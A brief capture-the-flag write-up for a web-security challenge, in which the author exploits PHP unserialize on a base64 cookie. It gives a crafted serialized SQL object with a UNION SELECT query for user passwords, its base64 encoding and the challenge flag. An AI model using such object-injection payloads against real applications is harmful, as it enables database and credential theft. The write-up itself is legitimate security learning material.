### Level04
Alright, title says this challenge is unserialize. Looks like the only place in the two sources unserialize is called is on a b64 encoded cookie named `leet_hax0r`.

According to source2, when a PHP object is destroyed, if there's a conn value, query will be executed on the sql database presumably containing the flag.

So, let's make a php object with conn and query.
To make life easy, they've given us a prototype and table name.
After some messing around with an online php editor and `serialize()`we now have   
`O:3:"SQL":2:{s:5:"query";s:81:"SELECT username FROM users WHERE id=1 UNION SELECT password FROM users WHERE id=1";s:4:"conn";N;}`

Which we can b64 to get
`TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIEZST00gdXNlcnMgV0hFUkUgaWQ9MSI7czo0OiJjb25uIjtOO30g`

Flag is `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`
